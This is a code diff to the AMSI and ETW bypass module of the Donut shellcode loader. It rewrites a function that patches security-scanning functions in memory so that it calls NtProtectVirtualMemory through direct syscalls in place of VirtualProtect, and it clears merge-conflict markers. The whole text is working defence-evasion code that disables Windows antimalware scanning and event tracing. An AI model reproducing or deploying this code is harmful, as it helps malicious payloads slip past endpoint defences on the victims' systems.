@@ -33,19 +33,18 @@
 #define BYPASS_AMSI_E
 #define BYPASS_ETW_C
 
-<<<<<<< HEAD
-#if defined(BYPASS_AMSI_A)
-=======
 #if defined(BYPASS_AMSI_E) || defined(BYPASS_ETW_C)
-BOOL ReplaceTarget(PDONUT_INSTANCE inst, BYTE* function, LPVOID target, DWORD function_len) {
+BOOL ReplaceTarget(PDONUT_INSTANCE inst, BYTE* function, LPVOID target, DWORD fl) {
   DWORD op, t;
+  NTSTATUS      status;
+  PSYSCALL_LIST syscall_list;
+  syscall_list = (PSYSCALL_LIST)(ULONG_PTR)inst->syscall_list;
+  SIZE_T function_len = (SIZE_T) fl;
+  if(!NT_SUCCESS(NtProtectVirtualMemory(NtCurrentProcess(), target, &function_len, PAGE_EXECUTE_READWRITE, &op, syscall_list))) return FALSE;
 
-  if(!inst->api.VirtualProtect(target, function_len, PAGE_EXECUTE_READWRITE, &op)) 
-    return FALSE;
   DPRINT("Overwriting function at: 0x%p", function);
   Memcpy(target, function, function_len);
-  if(!inst->api.VirtualProtect(target, function_len, op, &t))
-    return FALSE;
+  if(!NT_SUCCESS(NtProtectVirtualMemory(NtCurrentProcess(), target, &function_len, op, &t, syscall_list))) return FALSE;
   return TRUE;
 }
 #endif
@@ -112,7 +111,6 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
 }
 
 #elif defined(BYPASS_AMSI_A)
->>>>>>> c16aad1a1add85b861d4fa9dbb736ceb904c5ad3
 // This is where you may define your own AMSI bypass.
 // To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_A defined.
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
